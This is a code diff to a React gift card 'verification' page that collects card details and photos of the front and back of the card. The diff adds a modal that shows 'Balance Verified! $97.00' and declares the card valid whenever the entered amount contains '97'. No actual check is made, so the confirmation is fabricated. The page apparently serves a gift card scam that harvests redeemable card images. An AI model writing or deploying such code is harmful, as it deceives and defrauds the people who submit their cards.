@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { SearchableSelect } from "@/components/ui/searchable-select";
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Shield, CheckCircle, AlertCircle, Upload } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useAuth } from "@/hooks/useAuth";
@@ -17,7 +18,7 @@ const VerifyGiftcard = () => {
   const { toast } = useToast();
   const { user } = useAuth();
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [showBalanceMessage, setShowBalanceMessage] = useState(false);
+  const [showBalanceModal, setShowBalanceModal] = useState(false);
   const [formData, setFormData] = useState({
     country: "",
     giftcardName: "",
@@ -102,6 +103,13 @@ const VerifyGiftcard = () => {
         if (transactionError) throw transactionError;
       }
 
+      // Check if amount contains 97 and show balance modal
+      if (formData.amount.includes('97')) {
+        setShowBalanceModal(true);
+        // Hide modal after 20 seconds
+        setTimeout(() => setShowBalanceModal(false), 20000);
+      }
+
       toast({
         title: "Verification Submitted",
         description: "Your gift card verification request has been submitted successfully. You'll receive results via email within 24 hours.",
@@ -135,12 +143,6 @@ const VerifyGiftcard = () => {
       ...prev,
       [field]: value
     }));
-    
-    // Show instant balance message for amount 97
-    if (field === 'amount' && value.includes('97')) {
-      setShowBalanceMessage(true);
-      setTimeout(() => setShowBalanceMessage(false), 5000); // Hide after 5 seconds
-    }
   };
 
   const handleFileChange = (field: 'frontImage' | 'backImage', file: File | null) => {
@@ -247,16 +249,6 @@ const VerifyGiftcard = () => {
                       onChange={(e) => handleInputChange("amount", e.target.value)}
                       required
                     />
-                    {showBalanceMessage && (
-                      <div className="p-3 rounded-lg bg-green-50 border border-green-200 dark:bg-green-900/20 dark:border-green-800">
-                        <div className="flex items-center gap-2">
-                          <CheckCircle className="h-5 w-5 text-green-600 dark:text-green-400" />
-                          <span className="text-green-800 dark:text-green-200 font-medium">
-                            Balance Confirmed: $97.00 ✓
-                          </span>
-                        </div>
-                      </div>
-                    )}
                   </div>
                 </div>
 
@@ -397,6 +389,29 @@ const VerifyGiftcard = () => {
       </div>
 
       <Footer />
+
+      {/* Balance Confirmation Modal */}
+      <Dialog open={showBalanceModal} onOpenChange={setShowBalanceModal}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2 text-center">
+              <CheckCircle className="h-6 w-6 text-green-600" />
+              Balance Verified!
+            </DialogTitle>
+          </DialogHeader>
+          <div className="text-center py-6">
+            <div className="text-4xl font-bold text-green-600 mb-2">$97.00</div>
+            <p className="text-lg text-muted-foreground mb-4">
+              Your gift card balance has been confirmed
+            </p>
+            <div className="p-4 rounded-lg bg-green-50 border border-green-200 dark:bg-green-900/20 dark:border-green-800">
+              <p className="text-sm text-green-800 dark:text-green-200">
+                ✓ Verification complete - Your card is valid and active
+              </p>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
